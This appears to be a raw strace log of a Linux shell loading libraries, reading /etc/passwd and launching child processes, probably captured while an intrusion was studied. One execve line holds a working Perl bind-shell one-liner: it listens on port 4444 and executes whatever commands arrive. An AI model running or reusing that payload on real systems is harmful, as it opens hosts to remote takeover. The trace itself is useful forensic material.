\0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\340n\0\0\340~\0\0\340~\0\0\24\1\0\0\24\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\32\0\0\0&\0\0\0\4\0\0\0\7\0\0\0Q\0\200\2@\t\21\r\0\4\33\200\21H\262\201&\0\0\0\'\0\0\0(\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0)\0\0\0*\0\0\0+\0\0\0\0\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0\0\0\0\0\0\0\0\0002\0\0\0\0\0\0\0003\0\0\0004\0\0\0\0\0\0\0005\0\0\0\207[\246\22\365\33=\274\365\365K\23\0012\310%;]^\2674\10\301\346\357\37>\346\312\271\330\2749\303M%", 512) = 512
5350  07:08:43.586037 fstat64(1, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
5350  07:08:43.586054 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d7b000
5350  07:08:43.586066 mmap2(0xb7d82000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x6) = 0xb7d82000
5350  07:08:43.586082 close(1)          = 0
5350  07:08:43.586093 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5350  07:08:43.586107 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 1
5350  07:08:43.586120 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\0004\0\0\0\234B\1\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340,\1\0\340,\1\0\340,\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\3407\1\0\3407\1\0\5\0\0\0\0\20\0\0\1\0\0\0\300>\1\0\300N\1\0\300N\1\0\350\2\0\0()\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\300>\1\0\300N\1\0\300N\1\0004\1\0\0004\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\374\0\0\0q\0\0\0 \0\0\0\n\0\0\0\1\1$\232 \'Q\0@ \0\0\f\1\1\n\1\n\0\0\240:X\0@\1\16$\10\4\200\n`\260\23 @\24\21\20@\3442\324\4H\346\0\1`\3@\260\272\2019\30\235\340\0\0\332\200\0044\2\201J\20{\203+\200\22 d\21\1\0\2\200\306 d`A\n\4\4\4\v\4PD@\200\20\0\22 \4\340@\1\32 \4\2\20\10\0\0\204\260\200\0\340\23\0\212$\0\206\210\0\2`@q\0\0\0\0\0\0\0\0\0\0\0r\0\0\0\0\0\0\0t\0\0\0\0\0\0\0", 512) = 512
5350  07:08:43.586206 fstat64(1, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
5350  07:08:43.586222 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d63000
5350  07:08:43.586237 mmap2(0xb7d77000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7d77000
5350  07:08:43.586252 mmap2(0xb7d79000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d79000
5350  07:08:43.586265 close(1)          = 0
5350  07:08:43.586291 munmap(0xb7f09000, 29913) = 0
5350  07:08:43.586307 open("/etc/ld.so.cache", O_RDONLY) = 1
5350  07:08:43.586320 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
5350  07:08:43.586335 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f09000
5350  07:08:43.586345 close(1)          = 0
5350  07:08:43.586355 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5350  07:08:43.586369 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 1
5350  07:08:43.586396 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0\0004\0\0\0\320\201\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\350x\0\0\350x\0\0\350x\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\310}\0\0\310}\0\0\5\0\0\0\0\20\0\0\1\0\0\0\334~\0\0\334\216\0\0\334\216\0\0\374\1\0\0`\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360~\0\0\360\216\0\0\360\216\0\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334~\0\0\334\216\0\0\334\216\0\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0g\0\0\0000\0\0\0\20\0\0\0\t\0\0\0\2\0\0H  \26\20\0\0@g\3\0\3\6\30\24\0248A\30&\243\301\200\212\0048\21\10 B@\310\24\344\20\311\244\10\0\4\0\0@\0P!\0\0\204\0\0\0\0@\v\0y\243\0D\202\0\0\0\0000\0\0\0001\0\0\0\0\0\0\0002\0\0\0003\0\0\0004\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0005\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0006\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
5350  07:08:43.586526 fstat64(1, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
5350  07:08:43.586544 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d59000
5350  07:08:43.586555 mmap2(0xb7d61000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x7) = 0xb7d61000
5350  07:08:43.586572 close(1)          = 0
5350  07:08:43.586584 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5350  07:08:43.586597 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
5350  07:08:43.586611 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
5350  07:08:43.586699 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
5350  07:08:43.586715 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d4e000
5350  07:08:43.586726 mmap2(0xb7d57000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d57000
5350  07:08:43.586742 close(1)          = 0
5350  07:08:43.586763 munmap(0xb7f09000, 29913) = 0
5350  07:08:43.586778 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
5350  07:08:43.586795 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
5350  07:08:43.586807 _llseek(1, 0, [0], SEEK_CUR) = 0
5350  07:08:43.586818 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
5350  07:08:43.586834 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7f10000
5350  07:08:43.586845 _llseek(1, 1624, [1624], SEEK_SET) = 0
5350  07:08:43.586859 munmap(0xb7f10000, 1624) = 0
5350  07:08:43.586869 close(1)          = 0
5350  07:08:43.586908 getpgrp()         = 3831
5350  07:08:43.586950 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
5350  07:08:43.587001 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
5350  07:08:43.587017 brk(0x8101000)    = 0x8101000
5350  07:08:43.587048 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
5350  07:08:43.587062 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
5350  07:08:43.587076 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
5350  07:08:43.587113 brk(0x8102000)    = 0x8102000
5350  07:08:43.587138 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
5350  07:08:43.587157 stat64("/sbin/AB", 0xbf9a8ff8) = -1 ENOENT (No such file or directory)
5350  07:08:43.587169 stat64("/bin/AB", 0xbf9a8ff8) = -1 ENOENT (No such file or directory)
5350  07:08:43.587180 stat64("/usr/sbin/AB", 0xbf9a8ff8) = -1 ENOENT (No such file or directory)
5350  07:08:43.587192 stat64("/usr/bin/AB", 0xbf9a8ff8) = -1 ENOENT (No such file or directory)
5350  07:08:43.587205 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
5350  07:08:43.587219 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d846f8) = 5351
5351  07:08:43.587264 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5351  07:08:43.587280 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
5351  07:08:43.587292 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
5351  07:08:43.587304 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
5351  07:08:43.587319 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
5351  07:08:43.587334 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
5351  07:08:43.587347 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
5351  07:08:43.587378 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
5351  07:08:43.587379 --- SIGPIPE (Broken pipe) @ 0 (0) ---
5351  07:08:43.587379 exit_group(127)   = ?
5350  07:08:43.602814 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5350  07:08:43.603011 --- SIGCHLD (Child exited) @ 0 (0) ---
5350  07:08:43.603064 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 5351
5350  07:08:43.603121 waitpid(-1, 0xbf9a8c78, WNOHANG) = -1 ECHILD (No child processes)
5350  07:08:43.603152 sigreturn()       = ? (mask now [])
5350  07:08:43.603188 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
5350  07:08:43.603213 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5350  07:08:43.603225 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
5350  07:08:43.603237 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
5350  07:08:43.603255 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5350  07:08:43.603266 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
5350  07:08:43.603301 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
5350  07:08:43.603320 stat64("/sbin/perl", 0xbf9a9028) = -1 ENOENT (No such file or directory)
5350  07:08:43.603332 stat64("/bin/perl", 0xbf9a9028) = -1 ENOENT (No such file or directory)
5350  07:08:43.603344 stat64("/usr/sbin/perl", 0xbf9a9028) = -1 ENOENT (No such file or directory)
5350  07:08:43.603355 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
5350  07:08:43.603373 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
5350  07:08:43.603398 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
5350  07:08:43.603412 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d846f8) = 5352
4519  07:08:43.603453 waitpid(5350,  <unfinished ...>
5352  07:08:43.603520 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
5352  07:08:43.603551 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
5352  07:08:43.603584 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
5352  07:08:43.603596 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
5352  07:08:43.603611 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
5352  07:08:43.603625 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
5352  07:08:43.603638 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
5352  07:08:43.603672 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
5352  07:08:43.603758 brk(0)            = 0x8153000
5352  07:08:43.603777 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5352  07:08:43.603792 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f83000
5352  07:08:43.603807 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
5352  07:08:43.603824 open("/etc/ld.so.cache", O_RDONLY) = 1
5352  07:08:43.603836 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
5352  07:08:43.603852 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f7b000
5352  07:08:43.603863 close(1)          = 0
5352  07:08:43.603873 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5352  07:08:43.603887 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
5352  07:08:43.603901 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
5352  07:08:43.604039 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
5352  07:08:43.604060 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f77000
5352  07:08:43.604073 mmap2(0xb7f79000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f79000
5352  07:08:43.604089 close(1)          = 0
5352  07:08:43.604100 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5352  07:08:43.604128 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
5352  07:08:43.604142 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
5352  07:08:43.604230 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
5352  07:08:43.604247 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f52000
5352  07:08:43.604258 mmap2(0xb7f75000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7f75000
5352  07:08:43.604273 close(1)          = 0
5352  07:08:43.604284 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5352  07:08:43.604298 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
5352  07:08:43.604312 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
5352  07:08:43.604396 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
5352  07:08:43.604412 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f51000
5352  07:08:43.604425 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f39000
5352  07:08:43.604435 mmap2(0xb7f4d000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7f4d000
5352  07:08:43.604449 mmap2(0xb7f4f000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f4f000
5352  07:08:43.604494 close(1)          = 0
5352  07:08:43.604525 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5352  07:08:43.604553 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
5352  07:08:43.604583 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
5352  07:08:43.604670 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
5352  07:08:43.604688 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dea000
5352  07:08:43.604698 mmap2(0xb7f33000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f33000
5352  07:08:43.604716 mmap2(0xb7f36000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f36000
5352  07:08:43.604729 close(1)          = 0
5352  07:08:43.604740 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
5352  07:08:43.604753 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
5352  07:08:43.604767 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, 